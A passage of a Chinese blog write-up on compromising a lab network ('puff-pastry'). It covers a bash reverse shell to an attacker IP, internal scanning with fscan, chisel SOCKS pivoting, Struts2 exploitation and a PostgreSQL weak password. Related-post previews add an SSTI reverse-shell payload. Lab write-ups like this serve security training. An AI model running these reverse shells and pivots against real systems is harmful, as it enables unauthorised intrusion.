+<p>在蚁剑新建一个反弹shell的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.85.101.3/7777 0&gt;&amp;1</span><br><span class="line">chmod +x 1.sh</span><br><span class="line">bash 1.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811222042468.png" alt="image-20260811222042468"></p>
+<p>成功反弹shell，借助蚁剑上传fsan，chisel之后继续分析</p>
+<p>查看ip</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812101626675.png" alt="image-20260812101626675"></p>
+<p>发现有新的网段，扫描一下</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812102343487.png" alt="image-20260812102343487"></p>
+<p>可以看到172.56.102.3:5432是PostgreSQL服务，存在弱口令psotgres:password</p>
+<p>再扫一下poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_static -h 172.56.102.0/24 -full</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812102609559.png" alt="image-20260812102609559"></p>
+<p>在172.56.102.2:8080存在一个漏洞poc-yaml-struts2_045</p>
+<p>这里是存在有多个服务，我们只是无法通过像上面的方法一样直接通过socks代理转发，同反弹shell需要通过thinkphp作为跳板机，</p>
+<p>攻击机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel.exe server -p 1331 --reverse</span><br></pre></td></tr></table></figure>
+
+<p>thinkphp靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.141.168:1331 1331:1331</span><br></pre></td></tr></table></figure>
+
+<p>phpmyadmin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 10.85.101.3:1331 R:0.0.0.0:10005:socks</span><br></pre></td></tr></table></figure>
+
+<p>同步配置</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812135834564.png"></p>
+<p>访问<code>http://172.56.102.3:8080</code></p>
+<h2 id="Struts"><a href="#Struts" class="headerlink" title="Struts"></a>Struts</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812135929255.png" alt="image-20260812135929255"></p>
+<p>前面已经扫到了这里存在Struts2漏洞，<code>https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.73</code>下载漏扫工具，使用proxychains打开工具</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812140813369.png" alt="image-20260812140813369"></p>
+<p>注意刚才本机代理的端口为10005，修改配置文件</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812140932313.png" alt="image-20260812140932313"></p>
+<p>检测结果如下</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812141105975.png" alt="image-20260812141105975"></p>
+<p>直接读flag文件即可</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812141133401.png" alt="image-20260812141133401"></p>
+<h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><p>同时还有一个172.56.102.3:5432PostgreSQL服务，使用pgcli连接</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812145808523.png" alt="image-20260812145808523"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812150038475.png" alt="image-20260812150038475"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260812150013497.png" alt="image-20260812150013497"></p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>完整下来差不多弄了2天。这里必须点名一下那个<code>白海豚</code>还有<code>巴威</code>一个说去浙江的结果来河南了，弄得宁波的比赛都推迟了，河南苦苦下。一个说来河南到门口又走了，那时候还在打御网杯超级热，俩魔丸！！！！。还是建议找一个完整的时间把这个靶机打完，不然到内网还要重新配代理环境比较麻烦。最主要的还是使用chisel配置代理，这个配好其他都好说。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cxyadvancer.github.io">Seove0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cxyadvancer.github.io/2026/08/10/puff-pastry/">https://cxyadvancer.github.io/2026/08/10/puff-pastry/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://cxyadvancer.github.io" target="_blank">Seove0n</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post-share"><div class="social-share" data-image="/image/4.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/08/02/Vulnhub-Tempus-Fugit-3/" title="Vulnhub-Tempus-Fugit-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Vulnhub-Tempus-Fugit-3</div></div><div class="info-2"><div class="info-item-1">信息搜集1arp-scan -l   扫描一下端口  !!!怎么80没有开，访问网站也是访问不了不知道哪里出了问题。这里又换了成了VirtualBox打开，再扫一次  后来又摸索了一下，发现是kali在nat模式，在桥接模式下的配置没有配好，桥接网卡选择本机的无线网卡就可以了。也是  扫一下目录 1gobuster dir -u http://192.168.141.109 -w medium.txt -x php,txt,zip,html   漏洞利用访问&#x2F;login，&#x2F;logout都会重定向到首页，抓包看一下  啥也没有，就是写一个重定向，这里设计得很巧妙啊，没想到是在报错页面存在一个ssti，404页面抓个包  然后就是反弹shell 1&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.141.112/4444 0&g...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/07/31/vulnhub-Matrix-Breakout/" title="Vulnhub-Matrix-Breakout"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-31</div><div class="info-item-2">Vulnhub-Matrix-Breakout</div></div><div class="info-2"><div class="info-item-1">前言暑期过半，前一段时间松懈有些浮躁。还是需要静下心来沉淀，茶需慢慢摇，心急则味散。靶机所需要的环境配置这里就不过多赘述 信息搜集首先扫描一下网段存活的主机 1arp-scan -l   我们需要渗透的靶机ip就是192.168.100.133 扫描一下端口  开放了3个端口 目录扫描，常规扫描不行，这里要上点手段 12gobuster dir -u 192.168.100.133 -w  /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,bak,txt,html   漏洞利用访问&#x2F;graffiti.php有一个输入框，抓包看一下  经过测试message的参数会写进graffiti.txt文件中，并且还存在储存型xss，但是没啥用。同理尝试读一下graffiti.php  1234567891011121314151617181920&lt;?php$file=&quot;graffiti.txt&quot;;if($_SERVER[&#x27;REQUEST_METHOD&#x27...</div></div></div></a><a class="pagination-related" href="/2026/08/01/Vulnhub-DC-4/" title="Vulnhub-DC-4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-01</div><div class="info-item-2">Vulnhub-DC-4</div></div><div class="info-2"><div class="info-item-1">信息搜集扫描网段查看有一下存活的主机 1arp-scan -l   192.168.100.138就是靶机ip，看一下开放端口  开放22端口和80端口。 扫一下目录  漏洞利用访问靶机是一个登入页面，尝试sqlmap失败，根据页面提示应该是admin用户，尝试爆破密码  爆破出密码为happy，然后是有一个命令执行，抓包看一下,存在rce尝试写马没有成功，然后就反弹shell，这个要注意空格要改为+，  反弹之后获取交互式shell 1python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;  接下来就是提权，先看一下suid提权 1find / -user root -perm -4000 -print 2&gt;/dev/null   查看一下exim4的版本  该版本存在提权漏洞，找一下提权脚本  在靶机中运行脚本就行。 12cp /usr/share/exploitdb/exploits/linux/local/46996.sh .python -m http.server 7777  然后在靶...</div></div></div></a><a class="pagination-related" href="/2026/06/02/Vulnhub-DC-1/" title="Vulnhub-DC:1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-02</div><div class="info-item-2">Vulnhub-DC:1</div></div><div class="info-2"><div class="info-item-1">环境配置首先环境配置，需要将靶机和kali设置为NAT模式   当前网段是192.168.100.0/24  信息搜集nmap扫一下网段，主机探测 1nmap -sn 192.168.100.0/24   192.168.100.134就是我们要打的靶机。全量扫描一下 1nmap -T4 -A 192.168.100.134   web指纹识别 1whatweb -v 192.168.100。134   信息搜集如下： 端口服务信息： 1234522/tcp：ssh服务开启，版本：OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)80/tcp：HTTP服务开启，版本：Apache httpd 2.2.22 ((Debian))111/tcp: rpcbind服务开启，版本：2-4 (RPC #100000)  web指纹信息： 1234567Apache/2.2.22 (Debian)PHP 5.4.45CMS Drupal 7JQuery  漏洞利用漏洞利用关键在CMS Drupal 7，使用metasploit查找一下相关漏洞  12us...</div></div></div></a><a class="pagination-related" href="/2026/06/03/Vulnhub-DC-2/" title="Vulnhub-DC:2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-03</div><div class="info-item-2">Vulnhub-DC:2</div></div><div class="info-2"><div class="info-item-1">环境配置修改模式改为NAT模式  ​                  当前网段为192.168.100.0&#x2F;24 信息搜集首先扫描网段 1arp-scan -l   192.168.100.135就是目标靶机。nmap扫描一下 1nmap -A 192.168.100.135   扫描结果有80端口， Apache httpd 2.4.10 ((Debian))， 1Did not follow redirect to http://dc-2/  访问ip被重定向到http://dc-2 首先配置host文件，在C:\Windows\System32\drivers\etc\host在文件末尾中添加 1192.168.100.135 DC-2  再执行 1ipconfig /flushdns  就可以访问网站。 web指纹信息 1whatweb -v 192.168.100.135   WordPress 4.7.10 + Apache2.4.10 Debian 漏洞利用首先访问网站就可以得到flag1  你常用的单词列表可能不管用，所以，或许你需要发挥一下自己的特长...</div></div></div></a><a class="pagination-related" href="/2026/08/01/Web-Machine-N7/" title="Vulnhub-Web-Machine-N7"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-01</div><div class="info-item-2">Vulnhub-Web-Machine-N7</div></div><div class="info-2"><div class="info-item-1">环境准备这个靶机比较特殊，不能直接导入到vm中，需要使用VirtualBox。一开始调试了好久也没能把这个虚拟机导入到vm中，后来妥协了，把kali和这个靶机都改为桥接模式  根据这个MAC地址来分辨哪一个是靶机的ip  然后就可以了。 信息搜集扫描网段中存活的主机 1arp-scan -l   对应MAC地址知道靶机ip为192.168.141.136 下一步扫描一下端口  仅开放了80端口 扫一下目录 1gobuster dir -u &#x27;http://192.168.141.136&#x27; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak   扫出来3个文件，index.html,profile.php,exploit.html 漏洞利用接下来访问一下，发现一个文件上传，上传木马就直接404了  看一下这个html源代码 123456789101112&lt;html&gt;  &lt;!-- CSRF PoC - generated by Bu...</div></div></div></a><a class="pagination-related" href="/2026/08/02/Vulnhub-Tempus-Fugit-3/" title="Vulnhub-Tempus-Fugit-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-02</div><div class="info-item-2">Vulnhub-Tempus-Fugit-3</div></div><div class="info-2"><div class="info-item-1">信息搜集1arp-scan -l   扫描一下端口  !!!怎么80没有开，访问网站也是访问不了不知道哪里出了问题。这里又换了成了VirtualBox打开，再扫一次  后来又摸索了一下，发现是kali在nat模式，在桥接模式下的配置没有配好，桥接网卡选择本机的无线网卡就可以了。也是  扫一下目录 1gobuster dir -u http://192.168.141.109 -w medium.txt -x php,txt,zip,html   漏洞利用访问&#x2F;login，&#x2F;logout都会重定向到首页，抓包看一下  啥也没有，就是写一个重定向，这里设计得很巧妙啊，没想到是在报错页面存在一个ssti，404页面抓个包  然后就是反弹shell 1&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.141.112/4444 0&g...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/4.jpg" onerror="this.onerror=null;this.src='/null'" alt="avatar"/></div><div class="author-info-name">Seove0n</div><div class="author-info-description">路漫漫其修远兮，吾将上下而求索。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cxyadvancer"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cxyadvancer" target="_blank" title="Seove0n"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到 Seove0n 的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">渗透过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro"><span class="toc-number">2.1.</span> <span class="toc-text">shiro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp"><span class="toc-number">2.2.</span> <span class="toc-text">thinkphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis"><span class="toc-number">2.3.</span> <span class="toc-text">redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin"><span class="toc-number">2.4.</span> <span class="toc-text">phpmyadmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts"><span class="toc-number">2.5.</span> <span class="toc-text">Struts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PostgreSQL"><span class="toc-number">2.6.</span> <span class="toc-text">PostgreSQL</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/10/puff-pastry/" title="puff-pastry">puff-pastry</a><time datetime="2026-08-10T06:32:04.000Z" title="发表于 2026-08-10 14:32:04">2026-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/02/Vulnhub-Tempus-Fugit-3/" title="Vulnhub-Tempus-Fugit-3">Vulnhub-Tempus-Fugit-3</a><time datetime="2026-08-02T07:58:57.000Z" title="发表于 2026-08-02 15:58:57">2026-08-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/01/java%E5%86%85%E5%AD%98%E9%A9%AC-Servlet-Api/" title="java内存马-Servlet-Api">java内存马-Servlet-Api</a><time datetime="2026-08-01T14:23:12.000Z" title="发表于 2026-08-01 22:23:12">2026-08-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/01/Web-Machine-N7/" title="Vulnhub-Web-Machine-N7">Vulnhub-Web-Machine-N7</a><time datetime="2026-08-01T08:42:40.000Z" title="发表于 2026-08-01 16:42:40">2026-08-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/01/Vulnhub-DC-4/" title="Vulnhub-DC-4">Vulnhub-DC-4</a><time datetime="2026-08-01T07:16:46.000Z" title="发表于 2026-08-01 15:16:46">2026-08-01</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Seove0n</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5</a></span></div><div class="footer_custom_text">Seove0n's  Blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><script src="/js/tw_cn.js?v=5.5.5"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
